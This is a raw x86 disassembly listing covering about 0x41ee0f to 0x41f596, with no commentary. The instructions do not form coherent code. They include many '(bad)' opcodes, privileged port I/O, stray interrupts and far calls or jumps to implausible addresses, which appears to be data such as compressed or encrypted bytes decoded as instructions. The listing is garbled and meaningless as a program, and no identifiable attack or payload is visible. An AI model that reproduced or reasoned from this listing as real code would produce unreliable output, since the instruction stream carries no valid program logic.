  41ee0f:	pop    ebp
  41ee10:	xor    dl,BYTE PTR [esi-0x46]
  41ee13:	gs cmp edi,ecx
  41ee16:	sbb    dh,cl
  41ee18:	mov    bl,0xd5
  41ee1a:	fidiv  DWORD PTR [ecx+0x75ab5b42]
  41ee20:	adc    eax,0x41b29656
  41ee25:	fisttp QWORD PTR [ebp-0x35fc2b0b]
  41ee2b:	inc    eax
  41ee2c:	std    
  41ee2d:	sub    ah,BYTE PTR [esp+edi*4-0x33]
  41ee31:	inc    edx
  41ee32:	outs   dx,BYTE PTR ds:[esi]
  41ee33:	fcomp  DWORD PTR [edx-0x356c76a7]
  41ee39:	int    0x7a
  41ee3b:	cdq    
  41ee3c:	push   ebx
  41ee3d:	shl    dh,0x29
  41ee40:	(bad)  
  41ee42:	cmp    bh,BYTE PTR [ebx]
  41ee44:	addr16 mov esi,0x12fbf2d1
  41ee4a:	pop    ebx
  41ee4b:	test   al,0x4f
  41ee4d:	jo     0x41eea0
  41ee4f:	or     eax,0x8fc6015
  41ee54:	jmp    0x41eebb
  41ee56:	ficom  DWORD PTR [esi+0x10559e9d]
  41ee5c:	sbb    eax,0xd3017936
  41ee61:	popf   
  41ee62:	out    0x11,eax
  41ee64:	sbb    cl,BYTE PTR [esi+eax*8+0x25]
  41ee68:	scas   al,BYTE PTR es:[edi]
  41ee69:	add    BYTE PTR [si+0x1b],bl
  41ee6d:	jge    0x41eee1
  41ee6f:	data16 ds ja 0x41eed5
  41ee73:	inc    eax
  41ee74:	(bad)  
  41ee75:	fsubr  st,st(5)
  41ee77:	mov    eax,0x3b1d8972
  41ee7c:	pusha  
  41ee7d:	mov    ch,0x7f
  41ee7f:	or     ebp,DWORD PTR [edx+ebp*1-0x7c]
  41ee83:	lea    eax,ds:0xed93d7d1
  41ee89:	lahf   
  41ee8a:	test   al,0x5e
  41ee8c:	popa   
  41ee8d:	xor    al,0x3d
  41ee8f:	inc    ebp
  41ee90:	(bad)  
  41ee91:	stc    
  41ee92:	sub    ebx,DWORD PTR [ecx+0x6328cb07]
  41ee98:	or     dh,BYTE PTR [ebx-0x1d]
  41ee9b:	push   edi
  41ee9c:	jp     0x41eecc
  41ee9e:	(bad)  
  41ee9f:	mov    dh,BYTE PTR [edx]
  41eea1:	ins    DWORD PTR es:[edi],dx
  41eea2:	enter  0xabff,0x99
  41eea6:	inc    esi
  41eea7:	mov    al,BYTE PTR [ebp+0x438bc3c8]
  41eead:	and    ebx,DWORD PTR [edx+0x36e89a05]
  41eeb3:	cdq    
  41eeb4:	fadd   DWORD PTR [ebp-0x3d]
  41eeb7:	popf   
  41eeb8:	mov    ebx,0x44b4343c
  41eebd:	dec    edx
  41eebe:	xchg   BYTE PTR [esi],dh
  41eec0:	and    BYTE PTR [ebx+0x46],al
  41eec3:	mov    ebx,0x9aba6ddc
  41eec8:	push   ebp
  41eec9:	lds    esi,FWORD PTR [esi-0x2bb1f63c]
  41eecf:	rcl    bl,0x44
  41eed2:	add    DWORD PTR [edi],ebp
  41eed4:	mov    edx,?
  41eed6:	(bad)  
  41eed7:	in     eax,0xdf
  41eed9:	call   0x44e9:0x24d186cf
  41eee0:	add    ah,BYTE PTR [ecx+0x31d565fc]
  41eee6:	xchg   dh,bl
  41eee8:	iret   
  41eee9:	push   eax
  41eeea:	fwait
  41eeeb:	mov    ebp,0x7289f3e0
  41eef0:	mov    al,ds:0xece0e483
  41eef5:	push   eax
  41eef6:	shl    DWORD PTR [ebp-0x3],cl
  41eef9:	js     0x41eef4
  41eefb:	clc    
  41eefc:	ins    DWORD PTR es:[edi],dx
  41eefd:	stc    
  41eefe:	fcmovne st,st(4)
  41ef00:	cmp    eax,0x1dd1e433
  41ef05:	xor    eax,0x6f4eb54b
  41ef0a:	loopne 0x41ef62
  41ef0c:	fwait
  41ef0d:	or     eax,0xfca2c9d3
  41ef12:	sub    edi,ebx
  41ef14:	push   ebp
  41ef15:	xchg   ebx,esp
  41ef17:	jmp    0x41ef3a
  41ef19:	lahf   
  41ef1a:	hlt    
  41ef1b:	xchg   edi,eax
  41ef1c:	jg     0x41ef5a
  41ef1e:	jp     0x41ef9d
  41ef20:	push   ebx
  41ef21:	jns    0x41eeb3
  41ef23:	jns    0x41eef3
  41ef25:	push   cs
  41ef26:	retf   
  41ef27:	inc    edx
  41ef28:	(bad)  
  41ef29:	enter  0x9792,0x2e
  41ef2d:	pop    edx
  41ef2e:	std    
  41ef2f:	popa   
  41ef30:	sub    dh,bh
  41ef32:	sahf   
  41ef33:	call   0x63ba:0x7df7b09b
  41ef3a:	jno    0x41ef8d
  41ef3c:	ins    DWORD PTR es:[edi],dx
  41ef3d:	inc    ebp
  41ef3e:	clc    
  41ef3f:	mov    ebx,0x2dcb3368
  41ef44:	hlt    
  41ef45:	fsub   DWORD PTR [ebp+0x75dd911]
  41ef4b:	cwde   
  41ef4c:	push   esi
  41ef4d:	adc    eax,0x3d23d173
  41ef52:	leave  
  41ef53:	test   eax,0xed62db44
  41ef58:	jle    0x41ef11
  41ef5a:	aas    
  41ef5b:	call   0x8820:0xbd031481
  41ef62:	cmp    BYTE PTR [edi],ah
  41ef64:	loopne 0x41ef35
  41ef66:	sub    al,ah
  41ef68:	leave  
  41ef69:	add    al,0xc
  41ef6b:	ror    BYTE PTR [ebp-0x34914bb4],0x92
  41ef72:	lds    ebp,FWORD PTR [edx-0x16]
  41ef75:	cmp    BYTE PTR [edi+0x2c7f7825],bh
  41ef7b:	cmp    al,0xe5
  41ef7d:	inc    esi
  41ef7e:	and    eax,0x74a088f
  41ef83:	pop    ebp
  41ef84:	jmp    0x182c9c46
  41ef89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef8a:	lods   al,BYTE PTR ds:[esi]
  41ef8b:	xchg   ebp,eax
  41ef8c:	xor    eax,0xecafabb1
  41ef91:	xor    DWORD PTR [eax-0x4d65ea07],edx
  41ef97:	retf   
  41ef98:	sbb    bh,BYTE PTR [esi]
  41ef9a:	jle    0x41ef44
  41ef9c:	mov    esp,0xfa898737
  41efa1:	mov    ah,0x75
  41efa3:	into   
  41efa4:	fld    DWORD PTR [ebx+0x37330c39]
  41efaa:	stos   BYTE PTR es:[edi],al
  41efab:	sbb    bl,BYTE PTR [edi-0x55]
  41efae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efaf:	in     eax,0x84
  41efb1:	jnp    0x41ef62
  41efb3:	dec    ebx
  41efb4:	fist   WORD PTR [ebx+0x4cb7253f]
  41efba:	add    DWORD PTR [edx-0x63985ce7],ebx
  41efc0:	jno    0x41ef74
  41efc2:	call   DWORD PTR [edx]
  41efc4:	in     eax,dx
  41efc5:	dec    esi
  41efc6:	pop    ebp
  41efc7:	aas    
  41efc8:	adc    edx,esp
  41efca:	dec    ebp
  41efcb:	dec    eax
  41efcc:	push   es
  41efcd:	sbb    BYTE PTR [ecx],bl
  41efcf:	add    BYTE PTR [edi-0x5989a228],ah
  41efd5:	int3   
  41efd6:	out    dx,eax
  41efd7:	std    
  41efd8:	mov    bh,ah
  41efda:	mov    al,0xb2
  41efdc:	cld    
  41efdd:	or     DWORD PTR fs:[ebx+0x3b6dc545],eax
  41efe4:	add    eax,0xad839f21
  41efe9:	outs   dx,DWORD PTR ds:[esi]
  41efea:	jb     0x41efe9
  41efec:	clc    
  41efed:	es and eax,0x78020743
  41eff3:	repz mov bh,0x3d
  41eff6:	sbb    DWORD PTR [eax],ecx
  41eff8:	sub    esi,DWORD PTR [eax-0x78c14967]
  41effe:	jne    0x41efd0
  41f000:	mov    DWORD PTR [edx-0x33],ebx
  41f003:	(bad)  
  41f004:	and    ecx,DWORD PTR [ecx]
  41f006:	sahf   
  41f007:	dec    ecx
  41f008:	xor    DWORD PTR [ebp-0x7a4965c5],eax
  41f00e:	xlat   BYTE PTR ds:[ebx]
  41f00f:	xor    cl,0x1
  41f012:	in     eax,dx
  41f013:	sar    DWORD PTR [edx+0x33],0xd8
  41f017:	push   ds
  41f018:	nop
  41f019:	retf   
  41f01a:	inc    ebp
  41f01b:	(bad)  
  41f01c:	(bad)  
  41f01d:	cmp    al,0xf0
  41f01f:	jmp    0xe8d0d737
  41f024:	leave  
  41f025:	mov    ch,0x17
  41f027:	scas   eax,DWORD PTR es:[edi]
  41f028:	sbb    ecx,DWORD PTR [edi-0x7eb3e29d]
  41f02e:	fbld   TBYTE PTR [esi-0x449b976a]
  41f034:	into   
  41f035:	mov    edi,0x80f8a8cf
  41f03a:	xor    al,0xa5
  41f03c:	sbb    esi,DWORD PTR [edi-0x11]
  41f03f:	inc    ecx
  41f040:	fwait
  41f041:	xchg   ecx,eax
  41f042:	btr    DWORD PTR [edx],edi
  41f045:	clc    
  41f046:	mov    DWORD PTR [eax+0x6c],ebx
  41f049:	lods   al,BYTE PTR ds:[esi]
  41f04a:	xchg   edi,eax
  41f04b:	addr16 popa 
  41f04d:	xchg   edi,eax
  41f04e:	dec    esi
  41f04f:	shl    ebp,1
  41f051:	cmp    al,0x84
  41f053:	(bad)  
  41f054:	and    al,0x4
  41f056:	push   0x25f7655f
  41f05b:	fidiv  WORD PTR [bx]
  41f05e:	push   esp
  41f05f:	(bad)
  41f063:	jmp    0xf6edd9e2
  41f068:	ins    DWORD PTR es:[edi],dx
  41f069:	add    al,0x0
  41f06b:	sbb    BYTE PTR [edi],cl
  41f06d:	pop    esi
  41f06e:	hlt    
  41f06f:	pop    ecx
  41f070:	jns    0x41f004
  41f072:	mov    bl,BYTE PTR [ecx-0x74]
  41f075:	cld    
  41f076:	loope  0x41f09f
  41f078:	adc    DWORD PTR [ebx+0x6c235038],0x439089fc
  41f082:	cli    
  41f083:	push   edx
  41f084:	sbb    bh,cl
  41f086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f087:	mov    eax,ds:0xb100338a
  41f08c:	xchg   edx,eax
  41f08d:	or     dh,dl
  41f08f:	stos   BYTE PTR es:[edi],al
  41f090:	sbb    ecx,esi
  41f092:	gs pop esp
  41f094:	enter  0xc713,0x67
  41f098:	mov    DWORD PTR ds:0x3f27f4b7,esi
  41f09e:	fldenv [edx+0x4b]
  41f0a1:	(bad)  
  41f0a2:	fistp  DWORD PTR [edx-0x4b]
  41f0a5:	add    ebx,DWORD PTR [edx+0x25]
  41f0a8:	arpl   ax,ax
  41f0aa:	fimul  DWORD PTR ds:0x8369d759
  41f0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b1:	(bad)  
  41f0b2:	mov    bh,dh
  41f0b4:	mov    WORD PTR [edi-0x26163d9b],ss
  41f0ba:	mov    bh,0x8c
  41f0bc:	int    0xb6
  41f0be:	xchg   esp,eax
  41f0bf:	shr    DWORD PTR [edx],0x5c
  41f0c2:	push   ds
  41f0c3:	mov    dh,0xaa
  41f0c5:	nop
  41f0c6:	scas   eax,DWORD PTR es:[edi]
  41f0c7:	outs   dx,BYTE PTR ds:[esi]
  41f0c8:	mov    bl,BYTE PTR [edx+0x3a92e5f5]
  41f0ce:	add    DWORD PTR [esp+edx*1],ecx
  41f0d1:	sbb    eax,0x339e736d
  41f0d6:	dec    edx
  41f0d7:	xor    cl,BYTE PTR [ebp+0x5b1945f0]
  41f0dd:	adc    BYTE PTR ds:0xd90e42e9,ah
  41f0e3:	ret    0xa0e8
  41f0e6:	sar    DWORD PTR [ecx+0x20],1
  41f0e9:	mov    fs,esp
  41f0eb:	push   ebp
  41f0ec:	test   BYTE PTR [esi],bh
  41f0ee:	in     al,dx
  41f0ef:	loope  0x41f0e1
  41f0f1:	test   BYTE PTR [esi],bl
  41f0f3:	lds    ebx,FWORD PTR [edi-0x2da51f71]
  41f0f9:	aad    0x45
  41f0fb:	(bad)  
  41f0fd:	stc    
  41f0fe:	dec    esp
  41f0ff:	pop    es
  41f100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f101:	inc    ecx
  41f102:	dec    edi
  41f103:	push   ss
  41f104:	(bad)  [esi]
  41f106:	push   0x5e3e408c
  41f10b:	pop    ebx
  41f10c:	mov    cl,BYTE PTR [ebp-0x40fea193]
  41f112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f113:	daa    
  41f114:	sbb    dl,BYTE PTR [ecx+0x35]
  41f117:	ret    
  41f118:	add    al,0x71
  41f11a:	mov    ebp,0x3e1e7fad
  41f11f:	push   ebp
  41f120:	jne    0x41f18c
  41f122:	pop    esi
  41f123:	jo     0x41f18a
  41f125:	mov    ah,al
  41f127:	neg    cl
  41f129:	push   esp
  41f12a:	push   eax
  41f12b:	sbb    eax,0x3e037f80
  41f130:	add    eax,0x42422d3b
  41f135:	push   ss
  41f136:	sar    bl,0xcf
  41f139:	xor    al,BYTE PTR [edi-0x7ac528a1]
  41f13f:	aad    0xa3
  41f141:	pop    es
  41f142:	and    eax,0x5c74e919
  41f147:	jle    0x41f0dd
  41f149:	imul   ecx,DWORD PTR [esi-0x16],0xffffff90
  41f14d:	clc    
  41f14e:	push   cs
  41f14f:	mov    dl,0x71
  41f151:	(bad)  
  41f152:	sub    bl,BYTE PTR [ebx+edx*2]
  41f155:	xlat   BYTE PTR ds:[ebx]
  41f156:	push   esp
  41f157:	push   cs
  41f158:	and    al,0xab
  41f15a:	retf   
  41f15b:	cmp    ecx,DWORD PTR [ecx+0x78]
  41f15e:	pop    ecx
  41f15f:	dec    ebp
  41f160:	xor    eax,0xcc55df3e
  41f165:	pop    eax
  41f166:	xor    ah,ch
  41f168:	hlt    
  41f169:	mov    ecx,0x98d26692
  41f16e:	ja     0x41f0f9
  41f170:	xchg   esi,eax
  41f171:	enter  0x7bc1,0xa9
  41f175:	push   esp
  41f176:	sbb    al,0xf8
  41f178:	ror    DWORD PTR [ebp+0x50],0xf
  41f17c:	into   
  41f17d:	sub    bh,bh
  41f17f:	sti    
  41f180:	scas   al,BYTE PTR es:[edi]
  41f181:	cld    
  41f182:	pminsw mm0,QWORD PTR [ebx+esi*1]
  41f186:	jno    0x41f143
  41f188:	repnz loope 0x41f136
  41f18b:	or     al,0x1a
  41f18d:	shl    BYTE PTR [ecx],0x17
  41f190:	dec    esi
  41f191:	add    al,0x89
  41f193:	(bad)  
  41f194:	nop
  41f195:	ss cmp esp,edx
  41f198:	mov    es:0x60b49765,al
  41f19e:	stos   DWORD PTR es:[edi],eax
  41f19f:	jnp    0x41f13e
  41f1a1:	mov    esi,0x25e1dd84
  41f1a6:	mov    bl,BYTE PTR ds:0xf577469e
  41f1ac:	add    eax,0xefdace6c
  41f1b1:	call   0xd40a63de
  41f1b6:	sub    ecx,DWORD PTR [edi-0xe]
  41f1b9:	call   0x474e:0x549055fa
  41f1c0:	pop    esi
  41f1c1:	cmc    
  41f1c2:	popf   
  41f1c3:	mov    eax,0x7f4201d
  41f1c8:	fidiv  WORD PTR [ecx-0x6297d928]
  41f1ce:	outs   dx,BYTE PTR ds:[esi]
  41f1cf:	push   esp
  41f1d0:	pop    ds
  41f1d1:	std    
  41f1d2:	outs   dx,DWORD PTR ds:[esi]
  41f1d3:	mov    cl,0x85
  41f1d5:	aas    
  41f1d6:	loop   0x41f1e3
  41f1d8:	push   cs
  41f1d9:	mov    ecx,0x8780d95b
  41f1de:	pop    edx
  41f1df:	mov    al,0xd3
  41f1e1:	jmp    0xe7780865
  41f1e6:	sub    BYTE PTR [edx+0x5c28a44b],0x5f
  41f1ed:	xchg   ebp,eax
  41f1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ef:	(bad)  
  41f1f1:	ss mov bl,0x79
  41f1f4:	in     al,0x9a
  41f1f6:	sbb    al,0xd2
  41f1f8:	mov    esp,0x7d8bbea7
  41f1fd:	call   0x883db33b
  41f202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f203:	fimul  DWORD PTR [ecx+0x23aa4b79]
  41f209:	adc    BYTE PTR ds:0x9c0878d9,ah
  41f20f:	sti    
  41f210:	repnz hlt 
  41f212:	jge    0x41f286
  41f214:	push   es
  41f215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f216:	aaa    
  41f217:	shr    BYTE PTR [ecx-0x7ced0ac3],1
  41f21d:	inc    edi
  41f21e:	(bad)  
  41f220:	push   ebp
  41f221:	shl    DWORD PTR [eax+edx*8+0x3f],cl
  41f225:	repnz repnz fs out dx,eax
  41f229:	cmp    DWORD PTR [edx+0x27217f30],esi
  41f22f:	push   es
  41f230:	cwde   
  41f231:	xchg   ebx,eax
  41f232:	xlat   BYTE PTR ds:[ebx]
  41f233:	fisub  DWORD PTR [eax+0x1cb0afc1]
  41f239:	ins    BYTE PTR es:[edi],dx
  41f23a:	sub    dl,BYTE PTR [esi]
  41f23c:	push   ebp
  41f23d:	iret   
  41f23e:	and    BYTE PTR [edi+ebp*1+0x749aa2bd],bh
  41f245:	test   bh,dh
  41f247:	dec    ecx
  41f248:	mov    eax,0x4e2a999d
  41f24d:	and    BYTE PTR [edx+0x6712850f],dl
  41f253:	pop    ebp
  41f254:	mov    edi,0x938b65fb
  41f259:	dec    eax
  41f25a:	pushf  
  41f25b:	lods   al,BYTE PTR ds:[esi]
  41f25c:	sbb    al,0x12
  41f25e:	sti    
  41f25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f260:	mov    ds:0x3907ee4c,al
  41f265:	lock imul eax,DWORD PTR [eax+0x18],0xc26299ce
  41f26d:	xchg   BYTE PTR [esi+0xad59ff1],dh
  41f273:	xchg   ebx,eax
  41f274:	mov    al,bh
  41f276:	adc    ah,0x66
  41f279:	jle    0x41f2c3
  41f27b:	ret    
  41f27c:	arpl   cx,ax
  41f27e:	jmp    0x41f21f
  41f280:	inc    edx
  41f281:	jp     0x41f2b4
  41f283:	pop    ss
  41f284:	aas    
  41f285:	gs pop ebp
  41f287:	mov    esp,0x3b8df052
  41f28c:	inc    ebx
  41f28d:	fwait
  41f28e:	xor    eax,0x6ffe50a8
  41f293:	sub    ah,BYTE PTR [eax]
  41f295:	xlat   BYTE PTR ds:[ebx]
  41f296:	arpl   WORD PTR [edi],bx
  41f298:	daa    
  41f299:	mov    es,edi
  41f29b:	add    eax,0xb846078d
  41f2a0:	xlat   BYTE PTR ds:[ebx]
  41f2a1:	and    BYTE PTR [esi+eax*1+0x25],bh
  41f2a5:	xor    eax,0x6fa131a1
  41f2aa:	cmp    eax,0xf8a822f5
  41f2af:	mov    esi,0x73f79d4d
  41f2b4:	pop    ecx
  41f2b5:	(bad)  
  41f2b6:	aas    
  41f2b7:	and    BYTE PTR [eax+0xe9aaffa],al
  41f2bd:	fnstenv [ebx]
  41f2bf:	push   edi
  41f2c0:	lea    edi,[ecx-0x1a24eacf]
  41f2c6:	cwde   
  41f2c7:	inc    ebx
  41f2c8:	add    eax,0x679c8de8
  41f2cd:	(bad)  
  41f2ce:	cmp    eax,0xbf010588
  41f2d3:	mov    ah,0xbe
  41f2d5:	out    dx,eax
  41f2d6:	dec    esi
  41f2d7:	or     DWORD PTR [edx-0x361cbce8],0x2a
  41f2de:	push   ecx
  41f2df:	loope  0x41f33d
  41f2e1:	aad    0xe9
  41f2e3:	out    0x64,al
  41f2e5:	fiadd  DWORD PTR [edi-0x7a9024fa]
  41f2eb:	(bad)  
  41f2ec:	and    esp,DWORD PTR [ebx-0x41]
  41f2ef:	xor    DWORD PTR [eax+0x514cb836],0x2a
  41f2f6:	dec    eax
  41f2f7:	adc    dh,al
  41f2f9:	into   
  41f2fa:	(bad)  
  41f2fb:	push   esi
  41f2fc:	dec    ebp
  41f2fd:	push   edx
  41f2fe:	imul   ebp,DWORD PTR [eax],0x2c
  41f301:	and    ecx,0x8adadfe2
  41f307:	aas    
  41f308:	push   ds
  41f309:	mov    BYTE PTR [edx],bl
  41f30b:	cmp    al,0x29
  41f30d:	fbstp  TBYTE PTR [edx+0x105c3545]
  41f313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f314:	(bad)  
  41f315:	mov    edi,0x16756c7a
  41f31a:	jbe    0x41f35c
  41f31c:	jp     0x41f39b
  41f31e:	inc    eax
  41f31f:	bound  edi,QWORD PTR [edx+0x6b]
  41f322:	and    DWORD PTR [ecx],ecx
  41f324:	push   es
  41f325:	in     al,0x9b
  41f327:	sbb    ah,BYTE PTR [ebp-0x48]
  41f32a:	fidiv  WORD PTR [edi]
  41f32c:	inc    edi
  41f32d:	xchg   ebp,eax
  41f32e:	inc    esi
  41f32f:	daa    
  41f330:	add    BYTE PTR [esi+0x71],bl
  41f333:	stos   DWORD PTR es:[edi],eax
  41f334:	add    eax,0x292e36a1
  41f339:	dec    esp
  41f33a:	mov    DWORD PTR [ecx-0x76361186],esi
  41f340:	mov    edx,0xa2b86020
  41f346:	sub    ecx,DWORD PTR [eax+edx*2+0x2be1c33a]
  41f34d:	push   ss
  41f34e:	out    0x86,eax
  41f350:	adc    al,0x9a
  41f352:	pop    edi
  41f353:	adc    al,0x14
  41f355:	sbb    eax,DWORD PTR [edi-0x2f]
  41f358:	inc    edi
  41f359:	je     0x41f36a
  41f35b:	ss into 
  41f35d:	cwde   
  41f35e:	or     dl,ch
  41f360:	in     al,0x83
  41f362:	ror    eax,0x1a
  41f365:	aaa    
  41f366:	(bad)  
  41f367:	call   0x96d611b2
  41f36c:	xor    al,0x56
  41f36e:	adc    sp,WORD PTR [edi+0xc]
  41f372:	sub    DWORD PTR [ebp-0x1a],ecx
  41f375:	jo     0x41f372
  41f377:	dec    esi
  41f378:	(bad)  
  41f379:	adc    al,0x5d
  41f37b:	mov    ah,0xff
  41f37d:	loop   0x41f3b4
  41f37f:	aam    0x13
  41f381:	xor    ebp,ebx
  41f383:	std    
  41f384:	scas   al,BYTE PTR es:[edi]
  41f385:	mov    eax,DWORD PTR ds:0x6f88debd
  41f38b:	mov    esi,0xa6f485c1
  41f390:	iret   
  41f391:	jl     0x41f407
  41f393:	dec    esi
  41f394:	mov    edx,0xce288e49
  41f399:	ret    
  41f39a:	mov    al,ds:0xcaec6dea
  41f3a0:	push   ebx
  41f3a1:	cmp    bh,BYTE PTR [eax-0x5f31a819]
  41f3a7:	mov    cl,BYTE PTR [esp+ebp*2+0x5784f17c]
  41f3ae:	or     eax,esp
  41f3b0:	retf   
  41f3b1:	lea    edi,[eax+0x7d0460a4]
  41f3b7:	test   DWORD PTR ds:0x85c690b,ebp
  41f3bd:	(bad)  
  41f3be:	sub    al,0xbc
  41f3c0:	repnz das 
  41f3c2:	inc    esi
  41f3c3:	std    
  41f3c4:	outs   dx,BYTE PTR ds:[esi]
  41f3c5:	ret    
  41f3c6:	stos   DWORD PTR es:[edi],eax
  41f3c7:	xchg   ecx,eax
  41f3c8:	popa   
  41f3c9:	inc    ecx
  41f3ca:	mov    bl,0x23
  41f3cc:	jg     0x41f449
  41f3ce:	repz mov ah,0xfd
  41f3d1:	ror    esi,cl
  41f3d3:	inc    esi
  41f3d4:	sub    bl,BYTE PTR [eax]
  41f3d6:	shr    DWORD PTR [ebx+0x4615167a],1
  41f3dc:	xchg   ebx,eax
  41f3dd:	(bad)  
  41f3df:	xchg   esi,eax
  41f3e0:	pop    ebp
  41f3e1:	xlat   BYTE PTR ds:[ebx]
  41f3e2:	push   ebp
  41f3e3:	push   edx
  41f3e4:	jl     0x41f3a5
  41f3e6:	popf   
  41f3e7:	mov    esi,0x3e3795a3
  41f3ec:	sub    ebp,DWORD PTR [ebp+0x22b63dc0]
  41f3f2:	jno    0x41f441
  41f3f4:	call   0x97c2:0xf6eead81
  41f3fb:	ins    DWORD PTR es:[edi],dx
  41f3fc:	popa   
  41f3fd:	sub    eax,0xa195735f
  41f402:	sti    
  41f403:	and    al,0x5c
  41f405:	stos   DWORD PTR es:[edi],eax
  41f406:	test   DWORD PTR [ebp-0x5b533a4],0x35a295b4
  41f410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f411:	dec    esi
  41f412:	sbb    edx,DWORD PTR [edi-0x3c01bbee]
  41f418:	xchg   esp,eax
  41f419:	stos   DWORD PTR es:[edi],eax
  41f41a:	mov    dh,0xf8
  41f41c:	lock call 0xbeb2:0xe72cd9ba
  41f424:	test   eax,0x98adcf12
  41f429:	test   dh,ah
  41f42b:	ins    DWORD PTR es:[edi],dx
  41f42c:	stos   BYTE PTR es:[edi],al
  41f42d:	int    0xdb
  41f42f:	pop    ecx
  41f430:	fwait
  41f431:	inc    eax
  41f432:	xlat   BYTE PTR ds:[ebx]
  41f433:	jmp    0xf784:0x15c55eaf
  41f43a:	cmp    bl,BYTE PTR [esi]
  41f43c:	and    esi,DWORD PTR [ebp-0x1e03bf5c]
  41f442:	ins    BYTE PTR es:[edi],dx
  41f443:	cmp    cl,BYTE PTR [edi-0x2b7e2770]
  41f449:	jecxz  0x41f3e9
  41f44b:	mov    edi,0x284a4fa7
  41f450:	mov    eax,ds:0xc5857b0c
  41f455:	js     0x41f496
  41f457:	push   ebp
  41f458:	pusha  
  41f459:	in     eax,dx
  41f45a:	dec    edi
  41f45b:	mov    ch,0x2a
  41f45d:	jg     0x41f451
  41f45f:	sbb    BYTE PTR [ebp+0x31371479],cl
  41f465:	jle    0x41f4b4
  41f467:	xchg   al,dh
  41f469:	sub    eax,DWORD PTR [edx-0x31ea83cb]
  41f46f:	test   al,0x9e
  41f471:	and    eax,0x26b0967
  41f476:	inc    ebx
  41f477:	add    bh,BYTE PTR [edx+0x4cd5e378]
  41f47d:	popa   
  41f47e:	sbb    dh,BYTE PTR [ecx]
  41f480:	fs pushf 
  41f482:	cmp    eax,0x861ef579
  41f487:	push   ecx
  41f488:	leave  
  41f489:	sub    bh,BYTE PTR [edi]
  41f48b:	pop    esp
  41f48c:	xchg   ebx,eax
  41f48d:	jle    0x41f4d3
  41f48f:	mov    DWORD PTR [eax+edi*1+0x3a5070e7],ebp
  41f496:	fs and eax,0xd450b75f
  41f49c:	adc    eax,eax
  41f49e:	in     al,0x8
  41f4a0:	fistp  QWORD PTR ds:0xaab41585
  41f4a6:	pusha  
  41f4a7:	mov    ebp,gs
  41f4a9:	ja     0x41f473
  41f4ab:	sbb    edi,DWORD PTR [ebp-0x47078fee]
  41f4b1:	clc    
  41f4b2:	jl     0x41f4fe
  41f4b4:	fs pop eax
  41f4b6:	int3   
  41f4b7:	addr16 int3 
  41f4b9:	je     0x41f446
  41f4bb:	sbb    dl,BYTE PTR [edx+0x5d]
  41f4be:	pushf  
  41f4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4c0:	adc    al,0xeb
  41f4c2:	sub    ah,BYTE PTR [edx+0x17e2d107]
  41f4c8:	pop    eax
  41f4c9:	add    DWORD PTR ds:0xa619aa5f,edi
  41f4cf:	or     eax,0x1250c27d
  41f4d4:	sub    esi,DWORD PTR [edx-0x39]
  41f4d7:	mov    ds:0x4ed87cd5,al
  41f4dc:	and    BYTE PTR [edx-0x55],bl
  41f4df:	mov    esp,?
  41f4e1:	(bad)  
  41f4e2:	in     eax,0xc
  41f4e4:	sbb    edi,DWORD PTR [esi]
  41f4e6:	jns    0x41f53e
  41f4e8:	xchg   DWORD PTR [edx],edx
  41f4ea:	out    0xfe,al
  41f4ec:	sub    eax,0x7595c53c
  41f4f1:	enter  0x6e98,0xf3
  41f4f5:	sub    DWORD PTR [esi-0x172a2ec],ebp
  41f4fb:	mov    ah,0x2f
  41f4fd:	push   0xffffff91
  41f4ff:	retf   
  41f500:	(bad)  
  41f501:	or     eax,0x55fd44d7
  41f506:	jmp    0x76fa3a1
  41f50b:	ret    0x210a
  41f50e:	mov    ecx,0xeae2eb89
  41f513:	push   edi
  41f514:	push   ebx
  41f515:	xor    dh,cl
  41f517:	sub    ch,BYTE PTR [edi+eax*1-0x69d8bb42]
  41f51e:	daa    
  41f51f:	adc    BYTE PTR [ebx-0x2c],al
  41f522:	popf   
  41f523:	cmp    al,0xce
  41f525:	xchg   ebp,eax
  41f526:	dec    esi
  41f527:	xchg   dh,ah
  41f529:	aas    
  41f52a:	sub    bh,al
  41f52c:	in     eax,dx
  41f52d:	push   0xcc9982ec
  41f532:	pushf  
  41f533:	pushf  
  41f534:	xlat   BYTE PTR ds:[ebx]
  41f535:	shl    ecx,cl
  41f537:	cdq    
  41f538:	xchg   esi,eax
  41f539:	gs push ecx
  41f53b:	aaa    
  41f53c:	out    dx,eax
  41f53d:	jns    0x41f563
  41f53f:	sub    al,BYTE PTR ds:0x4ebaffd8
  41f545:	inc    ecx
  41f546:	add    BYTE PTR ds:0xc0a3ec34,dh
  41f54c:	pushf  
  41f54d:	pop    ds
  41f54e:	psadbw mm2,QWORD PTR [edi]
  41f551:	aas    
  41f552:	outs   dx,BYTE PTR ds:[esi]
  41f553:	prefetcht2 BYTE PTR [esi+0x17df2072]
  41f55a:	mov    ebp,0x7b3854cb
  41f55f:	xor    ebp,DWORD PTR [eax+0x422606c1]
  41f565:	inc    ecx
  41f566:	dec    edx
  41f567:	inc    esi
  41f568:	and    al,cl
  41f56a:	std    
  41f56b:	inc    edi
  41f56c:	das    
  41f56d:	in     al,dx
  41f56e:	test   DWORD PTR [ebp+edi*1+0x30401d10],ebx
  41f575:	push   0x3a
  41f577:	xchg   ebp,eax
  41f578:	xlat   BYTE PTR ds:[ebx]
  41f579:	fild   QWORD PTR [ecx]
  41f57b:	shld   DWORD PTR [ecx-0x6d29fc78],eax,0x4
  41f583:	push   0xffffffef
  41f585:	lods   eax,DWORD PTR ds:[esi]
  41f586:	cmp    eax,0xdb6c0d70
  41f58b:	pop    eax
  41f58c:	(bad)  
  41f58d:	xor    al,0x41
  41f58f:	jl     0x41f5d7
  41f591:	xchg   esi,eax
  41f592:	push   esi
  41f593:	pop    ds
  41f594:	(bad)  
  41f596:	lods   eax,DWORD PTR ds:[esi]
